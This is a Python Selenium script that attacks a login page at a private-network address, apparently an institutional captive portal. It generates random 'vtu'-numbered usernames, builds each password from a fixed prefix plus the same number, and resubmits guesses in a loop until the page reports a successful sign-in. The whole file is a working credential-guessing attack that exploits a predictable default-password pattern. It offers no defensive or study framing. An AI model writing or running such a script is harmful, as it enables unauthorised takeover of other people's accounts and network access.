from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager 
import random
import time

options = webdriver.ChromeOptions()
options.add_experimental_option("detach",True)

driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
def logbrute(user,passw):
        driver.get("http://172.17.1.10:8090/httpclient.html")
        driver.find_element(By.ID,"username").send_keys(user)
        driver.find_element(By.ID,"password").send_keys(passw)
        driver.find_element(By.ID,"loginbutton").click()
        time.sleep(0.1)
        statusmessage =driver.title
        return statusmessage

#to generate random vtu numbers
def randuser():
    lis = []
    randnum =random.randrange(19000,22000)
    user = "vtu"+str(randnum)
    passw = "9991072010"+str(randnum)
    lis =[user,passw]
    return lis
tries =1
while True:
    lis = randuser()
    user = lis[0]
    passw=lis[1]
    statusmessage=logbrute(user,passw)
    text = "You are signed in as "+lis[0]
    if statusmessage == text:
        print(statusmessage)
        print("connected at {} try".format(tries))
        break
    else:
        pass
    tries+=1

        
    
    

    
         
    
